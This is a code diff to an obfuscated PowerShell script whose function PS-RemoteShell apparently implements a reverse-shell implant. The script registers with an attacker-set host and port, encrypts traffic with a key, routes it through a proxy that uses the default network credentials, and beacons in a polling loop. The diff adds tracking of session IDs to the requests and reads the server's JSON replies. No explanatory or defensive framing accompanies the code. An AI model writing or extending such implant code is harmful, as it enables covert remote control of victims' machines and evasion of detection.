@@ -110,6 +110,8 @@ function VAR55 {
         [string]$Url,
         [Parameter(Mandatory=$True)]
         [string]$Data
+        [Parameter(Mandatory=$True)]
+        [string]$UUID
     )
 	
 	PROCESS {
@@ -123,7 +125,7 @@ function VAR55 {
 		Try {
 			$VAR33 = $VAR32.GetRequestStream()
 			$VAR34 = New-Object System.IO.StreamWriter($VAR33)
-			$VAR11 = @{"ID"=[GUID]::NewGuid(); "data"=$Data} | ConvertTo-Json -Compress 			
+			$VAR11 = @{"ID"=$UUID; "data"=$Data} | ConvertTo-Json -Compress 			
 			$VAR34.Write($VAR11)
 		} Finally {
 			if($null -ne $VAR34) { 
@@ -176,6 +178,7 @@ function PS-RemoteShell {
         $VAR18 = VAR51 -Length 16
         $VAR19 = VAR50
         $VAR21 = "register $($VAR18) $($VAR19)"
+		$VAR30 = [GUID]::NewGuid()
         (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         
         While($VAR17 -ne $True) {
@@ -199,11 +202,14 @@ function PS-RemoteShell {
             }
                     
             $VAR23 = ""
-            Start-Sleep -m $Delay
+			Start-Sleep -m $Delay
             $VAR37 = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
             $VAR21 = VAR54 -Buffer $VAR21 -Key $Key
             Try {
-                $VAR24 = VAR55 -Url $VAR37 -Data $VAR21
+                $VAR24 = VAR55 -Url $VAR37 -Data $VAR21 -UUID $VAR30
+				$VAR13 = $VAR24 | ConvertFrom-Json
+				$VAR30 = $VAR13.ID
+				$VAR24 = $VAR13.Data
                 $VAR23 = VAR53 -Buffer $VAR24 -Key $Key
             } Catch {
                 $VAR23 = ""
